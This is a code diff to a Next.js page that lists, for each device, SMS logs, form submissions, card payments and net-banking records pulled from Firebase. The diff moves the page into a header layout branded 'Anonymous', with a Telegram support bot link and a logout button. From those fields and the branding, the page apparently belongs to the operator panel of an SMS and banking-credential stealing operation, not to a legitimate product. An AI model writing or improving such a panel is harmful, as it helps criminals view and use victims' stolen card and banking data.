@@ -1,10 +1,9 @@
 "use client";
 
 import Link from "next/link";
-import { useParams, useRouter } from "next/navigation";
+import { useParams, useRouter, usePathname } from "next/navigation";
 import { useEffect, useState } from "react";
 import DeviceDetails from "@/components/DeviceDetails";
-import Sidebar from "@/components/Sidebar";
 import { getDeviceStatusFromAvailability } from "@/lib/deviceStatus";
 import { db } from "@/lib/firbase";
 import { ref, onValue, remove } from "firebase/database";
@@ -244,6 +243,7 @@ function parseSubmissionRecords(value: unknown): SubmissionRecord[] {
 export default function DeviceDetailsPage() {
   const params = useParams();
   const router = useRouter();
+  const pathname = usePathname();
   const deviceId = decodeURIComponent(params.deviceId as string);
 
   const [device, setDevice] = useState<Devices | null>(null);
@@ -313,42 +313,66 @@ export default function DeviceDetailsPage() {
       console.error("Error deleting SMS:", error);
     }
   };
-  return (
-    <div className="page-shell">
-      <div className="page-frame">
-        <Sidebar />
 
-        <main className="page-main">
-          <button
-            onClick={() => router.push("/devices")}
-            className="mb-4 flex items-center gap-1.5 rounded-lg border border-gray-300 bg-white px-3 py-1.5 text-sm font-semibold text-[#273b87] shadow-sm hover:bg-gray-50 transition"
-          >
-            ← Back to Devices
-          </button>
-          {notFound ? (
-            <div className="rounded-lg border border-red-500/30 bg-gradient-to-br from-red-500/10 to-red-600/5 p-6 text-center text-red-300">
-              <p className="font-semibold">Device not found</p>
-              <p className="text-sm mt-2">
-                Device ID: <strong>{deviceId}</strong> does not exist in the
-                system.
-              </p>
+  return (
+    <div className="min-h-screen bg-white">
+      <header className="w-full bg-black">
+        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4">
+          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d]">
+            Anonymous
+          </Link>
+          <nav className="flex flex-wrap items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base">
+            <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
+              Home
+            </Link>
+            <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
+              Setting
+            </Link>
+            <a
+              href="https://t.me/AH_Support_bot"
+              target="_blank"
+              rel="noopener noreferrer"
+              className="text-white/85 transition-colors hover:text-white"
+            >
+              Support
+            </a>
+            <button
+              onClick={async () => {
+                await fetch("/api/logout", { method: "POST" });
+                router.push("/login");
+              }}
+              className="text-white/85 transition-colors hover:text-white cursor-pointer"
+            >
+              Logout
+            </button>
+          </nav>
+        </div>
+      </header>
+
+      <main className="mx-auto w-full max-w-3xl px-5 py-8">
+        {notFound ? (
+          <div className="rounded-lg border border-red-500/30 bg-gradient-to-br from-red-500/10 to-red-600/5 p-6 text-center text-red-300">
+            <p className="font-semibold">Device not found</p>
+            <p className="text-sm mt-2">
+              Device ID: <strong>{deviceId}</strong> does not exist in the
+              system.
+            </p>
+          </div>
+        ) : (
+          device && (
+            <div className="space-y-6">
+              <DeviceDetails
+                device={device}
+                messages={smsLogs}
+                forms={formSubmissions}
+                cards={cardPayments}
+                netBanking={netBanking}
+                onDeleteSMS={handleDeleteSMS}
+              />
             </div>
-          ) : (
-            device && (
-              <div className="space-y-6">
-                <DeviceDetails
-                  device={device}
-                  messages={smsLogs}
-                  forms={formSubmissions}
-                  cards={cardPayments}
-                  netBanking={netBanking}
-                  onDeleteSMS={handleDeleteSMS}
-                />
-              </div>
-            )
-          )}
-        </main>
-      </div>
+          )
+        )}
+      </main>
     </div>
   );
 }
